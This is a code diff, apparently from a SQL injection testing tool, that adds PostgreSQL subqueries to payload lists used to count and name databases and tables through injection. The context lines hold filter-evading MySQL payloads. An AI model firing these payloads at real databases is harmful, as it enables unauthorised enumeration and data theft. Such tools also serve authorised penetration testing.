@@ -1875,6 +1875,7 @@ PAYLOADS_DBS_COUNT = {
         # "(/*!SELECT*//**_**/COUNT(*)%23/**_**/%0AFROM%23/**_**/%0A(/*!INFORMATION_SCHEMA*/./**_**//*!SCHEMATA*/))",
     ],
     "PostgreSQL": [
+        "(SELECT COUNT(DISTINCT(nspname)) FROM pg_namespace WHERE nspname NOT IN ('pg_catalog','information_schema','pg_toast'))",
         "(SELECT COUNT(DISTINCT(schemaname)) FROM pg_tables)",
         "(SELECT COUNT(TABLE_SCHEMA) FROM INFORMATION_SCHEMA.TABLES GROUP BY TABLE_SCHEMA)",
         "(SELECT COUNT(DISTINCT(schemaname)) FROM pg_tables ORDER by SCHEMANAME)",
@@ -1914,6 +1915,7 @@ PAYLOADS_DBS_NAMES = {
         # "(/*!SELECT*//**_**/CONCAT/**_**/(/*!50000SCHEMA_NAME*/)/**_**/FROM/**_**/%0A(/*!INFORMATION_SCHEMA*/./**_**//*!SCHEMATA*/)%23LIMIT 0,1)",
     ],
     "PostgreSQL": [
+        "(SELECT nspname FROM pg_namespace WHERE nspname NOT IN ('pg_catalog','information_schema','pg_toast') ORDER BY nspname OFFSET 0 LIMIT 1)",
         "(SELECT DISTINCT(schemaname) FROM pg_tables ORDER BY schemaname OFFSET 0 LIMIT 1)",
         "(SELECT CONCAT(TABLE_SCHEMA) FROM INFORMATION_SCHEMA.TABLES GROUP BY TABLE_SCHEMA OFFSET 0 LIMIT 1)",
         "(SELECT TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES GROUP BY TABLE_SCHEMA OFFSET 0 LIMIT 1)",
@@ -1941,6 +1943,7 @@ PAYLOADS_TBLS_COUNT = {
         # "(/*!SELECT*//**_**/COUNT(*)%23/**_**/%0AFROM%23/**_**/%0A(/*!INFORMATION_SCHEMA*/./**_**//*!TABLES*/)WHERE(TABLE_SCHEMA={db}))",
     ],
     "PostgreSQL": [
+        "(SELECT COUNT(*)::text FROM pg_class c JOIN pg_namespace n ON n.oid=c.relnamespace WHERE c.relkind='r' AND n.nspname={db})",
         "(SELECT COUNT(TABLENAME)::text FROM pg_tables WHERE SCHEMANAME={db})",
         "(SELECT COUNT(TABLENAME)::text FROM pg_tables WHERE SCHEMANAME LIKE '{db}')",
         "(SELECT COUNT(TABLENAME)::text FROM pg_tables WHERE SCHEMANAME IN ({db}))",
@@ -1982,6 +1985,7 @@ PAYLOADS_TBLS_NAMES = {
         "(/*!SELECT*/ CONCAT_WS(0x28,0x7e,/*!TABLE_NAME*/)FROM(/*!INFORMATION_SCHEMA*/./**_**//*!TABLES*/)/*!50000WHERE*/(TABLE_SCHEMA={db})LIMIT/**_**/0,1)",
     ],
     "PostgreSQL": [
+        "(SELECT c.relname::text FROM pg_class c JOIN pg_namespace n ON n.oid=c.relnamespace WHERE c.relkind='r' AND n.nspname={db} ORDER BY c.relname OFFSET 0 LIMIT 1)",
         "(SELECT TABLENAME::text FROM pg_tables WHERE SCHEMANAME={db} OFFSET 0 LIMIT 1)",
         "(SELECT TABLENAME::text FROM pg_tables WHERE SCHEMANAME LIKE {db} OFFSET 0 LIMIT 1)",
         "(SELECT TABLENAME::text FROM pg_tables WHERE SCHEMANAME IN({db}) OFFSET 0 LIMIT 1)",
